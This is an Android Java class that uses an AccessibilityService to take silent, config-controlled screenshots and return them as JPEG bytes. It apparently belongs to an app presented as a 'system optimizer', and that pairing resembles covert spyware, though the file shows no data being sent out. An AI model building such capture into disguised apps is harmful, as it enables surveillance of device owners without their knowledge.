package com.system.optimizer.handler;

import java.io.ByteArrayOutputStream;
import java.util.concurrent.atomic.AtomicBoolean;

import com.system.optimizer.config.ConfigManager;
import com.system.optimizer.config.ConfigData;

import android.accessibilityservice.AccessibilityService;
import android.graphics.Bitmap;
import android.graphics.ColorSpace;
import android.hardware.HardwareBuffer;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;

/**
 * Callback interface for screenshot capture result.
 */
interface ScreenshotCallback {
    void onSuccess(byte[] imageData);
    void onError(String errorMessage);
}

public class ScreenshotCapture {
    private static final String TAG = "ScreenshotCapture";

    private final AccessibilityService service;
    private final ConfigManager configManager;
    private final Handler mainHandler;
    
    // Ensure only one capture at a time
    private final AtomicBoolean isCapturing = new AtomicBoolean(false);

    public ScreenshotCapture(AccessibilityService delegate, ConfigManager configManager) {
        if (delegate == null) {
            throw new IllegalArgumentException("AccessibilityService cannot be null");
        }
        if (configManager == null) {
            throw new IllegalArgumentException("ConfigManager cannot be null");
        }
        this.service = delegate;
        this.configManager = configManager;
        this.mainHandler = new Handler(Looper.getMainLooper());
    }

    /**
     * Take a screenshot asynchronously on background thread.
     * Only one capture can be in progress at a time.
     * 
     * @param callback Called with result on main thread
     */
    public void takeScreenshot(ScreenshotCallback callback) {
        // Reject if already capturing - only one at a time
        if (!isCapturing.compareAndSet(false, true)) {
            mainHandler.post(() -> callback.onError("Screenshot already in progress"));
            return;
        }

        // Run validation and capture on main thread
        try {
            ConfigData config = configManager.getCachedConfig();
            if (config == null) {
                completeWithError(callback, "Config not loaded");
                return;
            }
            if (!config.isAutoScreenshotEnabled()) {
                completeWithError(callback, "Screenshot disabled in config");
                return;
            }
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
                completeWithError(callback, "API < 30 not supported");
                return;
            }

            // Take screenshot from main thread
            takeScreenshotInternal(callback, config.getScreenshotQuality());

        } catch (Exception e) {
            android.util.Log.e(TAG, "Error: " + e.getMessage());
            completeWithError(callback, "Error: " + e.getMessage());
        }
    }

    /**
     * Internal method - must be called from main thread for takeScreenshot API.
     */
    private void takeScreenshotInternal(ScreenshotCallback callback, int quality) {
        mainHandler.post(() -> {
            try {
                service.takeScreenshot(
                        android.view.Display.DEFAULT_DISPLAY,
                        service.getMainExecutor(),
                        new ScreenshotResultHandler(callback, quality));
            } catch (Exception e) {
                android.util.Log.e(TAG, "Error initiating screenshot: " + e.getMessage());
                completeWithError(callback, "Error initiating: " + e.getMessage());
            }
        });
    }

    /**
     * Complete callback with error on main thread.
     */
    private void completeWithError(ScreenshotCallback callback, String message) {
        isCapturing.set(false);
        mainHandler.post(() -> callback.onError(message));
    }

    /**
     * Callback handler for takeScreenshot result.
     */
    private class ScreenshotResultHandler implements AccessibilityService.TakeScreenshotCallback {
        private final ScreenshotCallback callback;
        private final int quality;

        ScreenshotResultHandler(ScreenshotCallback callback, int quality) {
            this.callback = callback;
            this.quality = quality;
        }

        @Override
        public void onSuccess(AccessibilityService.ScreenshotResult result) {
            try {
                if (result == null) {
                    completeWithError(callback, "Screenshot result is null");
                    return;
                }

                HardwareBuffer buffer = result.getHardwareBuffer();
                if (buffer == null) {
                    completeWithError(callback, "Hardware buffer is null");
                    return;
                }

                ColorSpace colorSpace = result.getColorSpace();
                if (colorSpace == null) {
                    colorSpace = ColorSpace.get(ColorSpace.Named.SRGB);
                }

                Bitmap bitmap = Bitmap.wrapHardwareBuffer(buffer, colorSpace);
                buffer.close();

                if (bitmap == null) {
                    completeWithError(callback, "Failed to create bitmap");
                    return;
                }

                byte[] imageData = bitmapToJpegBytes(bitmap, quality);
                bitmap.recycle();

                isCapturing.set(false);
                callback.onSuccess(imageData);

            } catch (Exception e) {
                android.util.Log.e(TAG, "Error processing: " + e.getMessage());
                completeWithError(callback, "Error processing: " + e.getMessage());
            }
        }

        @Override
        public void onFailure(int error) {
            String errorMessage = "Screenshot failed with error: " + error;
            android.util.Log.w(TAG, errorMessage);
            completeWithError(callback, errorMessage);
        }
    }

    /**
     * Convert Bitmap to JPEG byte array.
     */
    private static byte[] bitmapToJpegBytes(Bitmap bitmap, int quality) {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        bitmap.compress(Bitmap.CompressFormat.JPEG, quality, baos);
        return baos.toByteArray();
    }

}